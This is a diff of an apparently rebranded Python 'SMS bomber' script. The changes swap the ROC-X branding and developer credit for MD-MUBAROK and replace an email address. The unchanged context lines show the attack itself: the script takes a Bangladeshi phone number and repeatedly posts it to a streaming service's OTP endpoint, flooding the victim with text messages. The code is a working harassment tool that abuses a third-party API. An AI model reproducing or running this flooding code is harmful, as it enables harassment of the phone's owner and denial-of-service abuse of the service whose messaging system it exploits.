@@ -18,7 +18,7 @@ logo ="""⸎ ⸎⸎ ⸎⸎ ⸎ ⸎ ⸎ ⸎ ⸎ ⸎ ⸎ ⸎⸎ ⸎ ⸎ ⸎ ⸎ �
 
       
  #HEADER                
-text=cyan+"\t\tDeveloped By : Hacker Boy"+green+"\n\n\t\t★★ ROC-X BD SMS Bomber ★★   \n" 
+text=cyan+"\t\tDeveloped By : Hacker Boy"+green+"\n\n\t\t★★ MD-MUBAROK BD SMS Bomber ★★   \n" 
 notice=""     
 def header():
 	print(logo)
@@ -28,7 +28,7 @@ def header():
 #SELECT_MAIN
 def opt():
 	print(cyan+"\n==> Select Your Option From Below")
-	print(yellow+"\n\n [1] Start BD SMS Bombing\n\n [2] Back to ROC-X")
+	print(yellow+"\n\n [1] Start BD SMS Bombing\n\n [2] Back to MD-MUBAROK")
 	
 
 #MAIN_TOOL
@@ -39,7 +39,7 @@ opt()
 while tt<2:
 	opt2=str(input(blue+"\n\n [>] Enter the number of option : "+yellow))
 	if opt2=="1":
-		text=cyan+"\t\tDeveloped By : Sanaur Asif"+green+"\n\n\t\t★★ ROC-X BD SMS Bomber ★★   \n" 
+		text=cyan+"\t\tDeveloped By : Hacker-Boy"+green+"\n\n\t\t★★ MD-MUBAROK BD SMS Bomber ★★   \n" 
 		os.system('clear')
 		header()
 		number=str(input(blue+"\n\n [>] Enter The BD Number : "+yellow))
@@ -69,29 +69,29 @@ while tt<2:
 					headers["Origin"] = "https://www.hoichoi.tv"
 					headers["Referer"] = "https://www.hoichoi.tv/"
 					headers["Connection"] = "keep-alive"
-					data = """{\"requestType\":\"send\",\"phoneNumber\":\"+88"""+number+"""\",\"emailConsent\":true,\"whatsappConsent\":true,\"email\":\"sanaur.asif@gmail.com\"}"""
+					data = """{\"requestType\":\"send\",\"phoneNumber\":\"+88"""+number+"""\",\"emailConsent\":true,\"whatsappConsent\":true,\"email\":\"banglahacker404@gmail.com\"}"""
 					r= requests.post(url, headers=headers, data=data)
 												
 				if ammount2==1:
-					print(cyan+"\n\t  ★★ROC-X★★==>   "+green+"[✓] 1st SMS Sent.")
+					print(cyan+"\n\t  ★★MD-MUBAROK★★==>   "+green+"[✓] 1st SMS Sent.")
 				elif ammount2==2:
-					print(cyan+"\n\t  ★★ROC-X★★==>   "+green+"[✓] 2nd SMS Sent.")
+					print(cyan+"\n\t  ★★MD-MUBAROK★★==>   "+green+"[✓] 2nd SMS Sent.")
 				elif ammount2==3:
-					print(cyan+"\n\t  ★★ROC-X★★==>   "+green+"[✓] 3rd SMS Sent.")
+					print(cyan+"\n\t  ★★MD-MUBAROk★★==>   "+green+"[✓] 3rd SMS Sent.")
 				else:
-					print(cyan+"\n\t  ★★ROC-X★★==>   "+green+"[✓] "+str(ammount2)+"th SMS Sent.")
+					print(cyan+"\n\t  ★★MD-MUBAROK★★==>   "+green+"[✓] "+str(ammount2)+"th SMS Sent.")
 				time.sleep(1)
 				totalsent+=1
 				ammount2+=1
 			except:
 				if ammount2==1:
-					print(cyan+"\n\t  ★★ROC-X★★==>   "+red+"[×] 1st SMS Not Sent.")
+					print(cyan+"\n\t  ★★MD-MUBAROK★★==>   "+red+"[×] 1st SMS Not Sent.")
 				elif ammount2==2:
-					print(cyan+"\n\t  ★★ROC-X★★==>   "+red+"[×] 2nd SMS Not Sent.")
+					print(cyan+"\n\t  ★★MD-MUBAROK★★==>   "+red+"[×] 2nd SMS Not Sent.")
 				elif ammount2==3:
-					print(cyan+"\n\t  ★★ROC-X★★==>   "+red+"[×] 3rd SMS Not Sent.")
+					print(cyan+"\n\t  ★★MD-MUBAROk★★==>   "+red+"[×] 3rd SMS Not Sent.")
 				else:
-					print(cyan+"\n\t  ★★ROC-X★★==>   "+red+"[×] "+str(ammount2)+"th SMS Not Sent.")
+					print(cyan+"\n\t  ★★MD-MUBAROK ★★==>   "+red+"[×] "+str(ammount2)+"th SMS Not Sent.")
 					time.sleep(10)
 					ammount2+=1
 									
@@ -104,7 +104,7 @@ while tt<2:
 		lastt=str(input(cyan+"\n\n\t\t  [✓] All Done!\n\t [•] Now Press Enter Key To Continue\n"))
 		os.system('clear')
 		notice=""
-		text=green+"\n\n\t\t★★★ROC-X SMS Tools★★★   \n" 
+		text=green+"\n\n\t\t★★★MD-MUBAROK SMS Tools★★★   \n" 
 		header()
 		opt()
 	
@@ -112,7 +112,7 @@ while tt<2:
 	elif opt2=="3":
 		os.system("python3 main2.py")
 	else:
-		text=cyan+"\t\tDeveloped By : Hacker-Boy "+green+"\n\n\t\t★★ ROC-X BD SMS Bomber ★★   \n" 
+		text=cyan+"\t\tDeveloped By : Hacker-Boy "+green+"\n\n\t\t★★ MD-MUBAROK BD SMS Bomber ★★   \n" 
 		notice=red+"\n\t\t[×] Wrong Value Entered"
 		os.system('clear')
 		header()
